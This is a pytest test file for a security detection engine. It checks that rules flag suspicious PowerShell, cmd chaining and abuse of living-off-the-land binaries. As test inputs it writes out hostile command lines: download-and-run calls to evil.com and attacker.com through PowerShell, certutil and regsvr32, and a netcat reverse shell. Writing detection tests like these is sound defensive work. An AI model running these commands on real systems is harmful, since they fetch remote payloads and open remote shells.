import pytest
from app.db.session import SessionLocal
from app.models.device import Device, DeviceStatus, OSType
from app.models.alert import Alert
from app.models.threat import ThreatSeverity, ThreatType
from app.detection.engine import DetectionEngine
from app.detection.rules.suspicious_powershell import SuspiciousPowerShellRule
from app.detection.rules.suspicious_cmd import SuspiciousCmdRule
from app.detection.rules.lolbins import LOLBinsRule
from app.schemas.process import ProcessInfoCreate
from app.services.process_service import ingest_processes


def test_suspicious_powershell_rule():
    rule = SuspiciousPowerShellRule()

    # 1. DownloadString execution (CRITICAL)
    res1 = rule.evaluate_process(
        pid=101,
        name="powershell.exe",
        cmdline="powershell.exe -nop -w hidden (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
    )
    assert res1 is not None
    assert res1.severity == ThreatSeverity.CRITICAL
    assert res1.threat_type == ThreatType.SUSPICIOUS_POWERSHELL

    # 2. Encoded command (HIGH)
    res2 = rule.evaluate_process(
        pid=102,
        name="pwsh",
        cmdline="pwsh -enc aGVsbG8gd29ybGQ="
    )
    assert res2 is not None
    assert res2.severity == ThreatSeverity.HIGH

    # 3. Legitimate powershell run (None)
    res3 = rule.evaluate_process(
        pid=103,
        name="powershell.exe",
        cmdline="powershell.exe Get-Process"
    )
    assert res3 is None


def test_suspicious_cmd_rule():
    rule = SuspiciousCmdRule()

    # 1. Piping into powershell (HIGH)
    res1 = rule.evaluate_process(
        pid=201,
        name="cmd.exe",
        cmdline="cmd.exe /c echo payload | powershell -"
    )
    assert res1 is not None
    assert res1.severity == ThreatSeverity.HIGH
    assert res1.threat_type == ThreatType.SUSPICIOUS_CMD

    # 2. Command chaining (MEDIUM)
    res2 = rule.evaluate_process(
        pid=202,
        name="cmd.exe",
        cmdline="cmd.exe /c dir && whoami & ipconfig"
    )
    assert res2 is not None
    assert res2.severity == ThreatSeverity.MEDIUM


def test_lolbins_rule():
    rule = LOLBinsRule()

    # 1. CertUtil download (CRITICAL)
    res1 = rule.evaluate_process(
        pid=301,
        name="certutil.exe",
        cmdline="certutil.exe -urlcache -split -f http://evil.com/malware.exe payload.exe"
    )
    assert res1 is not None
    assert res1.severity == ThreatSeverity.CRITICAL
    assert res1.threat_type == ThreatType.LOLBIN_ABUSE

    # 2. Regsvr32 Squiblydoo (CRITICAL)
    res2 = rule.evaluate_process(
        pid=302,
        name="regsvr32.exe",
        cmdline="regsvr32.exe /s /u /i:http://evil.com/test.sct scrobj.dll"
    )
    assert res2 is not None
    assert res2.severity == ThreatSeverity.CRITICAL

    # 3. Linux Netcat reverse shell (CRITICAL)
    res3 = rule.evaluate_process(
        pid=303,
        name="nc",
        cmdline="nc -e /bin/bash 10.0.0.1 4444"
    )
    assert res3 is not None
    assert res3.severity == ThreatSeverity.CRITICAL


def test_process_ingestion_behavioral_alert():
    db = SessionLocal()
    try:
        # Create test device
        device = Device(
            hostname="behavior-test-host",
            ip_address="192.168.1.200",
            mac_address="AA:BB:CC:DD:EE:77",
            os_type=OSType.WINDOWS,
            status=DeviceStatus.ONLINE
        )
        db.add(device)
        db.commit()
        db.refresh(device)

        # Ingest process with CertUtil remote download LOLBin
        proc_payload = [
            ProcessInfoCreate(
                pid=9999,
                ppid=1,
                name="certutil.exe",
                exe_path="C:\\Windows\\System32\\certutil.exe",
                username="SYSTEM",
                cmdline="certutil.exe -urlcache -f http://attacker.com/bad.exe C:\\temp\\bad.exe"
            )
        ]

        ingest_processes(db=db, device_id=device.id, processes_in=proc_payload)

        # Check that an Alert was automatically generated
        alerts = db.query(Alert).filter(Alert.device_id == device.id).all()
        assert len(alerts) >= 1
        alert = alerts[0]
        assert "CertUtil" in alert.message or "CertUtil" in alert.title
        assert alert.severity.value in ["HIGH", "CRITICAL"]

    finally:
        db.close()
